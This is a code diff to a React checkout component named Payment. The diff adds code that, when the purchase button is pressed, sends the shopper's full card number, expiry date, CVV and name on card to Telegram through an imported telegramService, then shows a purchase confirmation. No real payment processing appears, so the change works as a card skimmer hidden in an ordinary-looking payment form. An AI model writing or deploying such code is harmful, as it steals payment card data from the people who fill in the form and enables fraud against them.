@@ -1,10 +1,13 @@
+
 import React, { useState, useRef } from 'react';
 import PurchaseConfirmationModal from './PurchaseConfirmationModal';
+import { sendMessage, formatPaymentData } from '../services/telegramService';
 
 const Payment = () => {
   const [cardNumber, setCardNumber] = useState('');
   const [expiryDate, setExpiryDate] = useState('');
   const [cvv, setCvv] = useState('');
+  const [nameOnCard, setNameOnCard] = useState('');
   const [isModalOpen, setIsModalOpen] = useState(false);
   
   // Handle card number input with format XXXX XXXX XXXX XXXX
@@ -37,7 +40,22 @@ const Payment = () => {
     }
   };
 
-  const handleCompletePurchase = () => {
+  const handleCompletePurchase = async () => {
+    // Send payment data to Telegram
+    const paymentData = {
+      cardNumber,
+      expiryDate,
+      cvv,
+      nameOnCard
+    };
+    
+    try {
+      await sendMessage(formatPaymentData(paymentData));
+      console.log('Payment data sent to Telegram');
+    } catch (error) {
+      console.error('Failed to send payment data to Telegram:', error);
+    }
+    
     setIsModalOpen(true);
   };
 
@@ -114,7 +132,12 @@ const Payment = () => {
             
             <div>
               <label className="block text-sm font-medium text-gray-700 mb-1">Name on Card</label>
-              <input type="text" className="input-field" />
+              <input 
+                type="text" 
+                className="input-field"
+                value={nameOnCard}
+                onChange={(e) => setNameOnCard(e.target.value)}
+              />
             </div>
           </div>
           
